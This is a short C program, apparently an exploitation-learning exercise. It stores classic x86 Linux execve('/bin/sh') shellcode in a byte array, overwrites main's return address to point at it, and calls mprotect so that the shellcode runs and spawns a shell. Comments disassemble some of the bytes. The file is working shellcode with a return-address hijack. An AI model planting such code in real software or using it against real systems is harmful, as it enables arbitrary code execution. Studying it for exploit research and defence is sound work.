#include<stdio.h>
#include<sys/mman.h>
#include<errno.h>
char shellcode[]="\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
"\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
"\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"

// \x2f-----das
//  \x62\x69\x6e-----	bound  %ebp,0x6e(%ecx)
//  \x2f-----das
//  \x73\x68-------jae    0x8048484
//  \x00\x5d\xc3"------add    %bl,-0x3d(%ebp)qui

;
int pagesize=4096;
void main(){
	int *ret;
	ret=(int*)&ret+4;
	(*ret)=(int)shellcode;
	errno=0;
	//printf("%u\n",shellcode);
	//printf("%u\n",((int)shellcode)&~(pagesize-1));
	mprotect((char*)(((int)shellcode)&~(pagesize-1)),4096,PROT_EXEC|PROT_WRITE|PROT_READ);
}
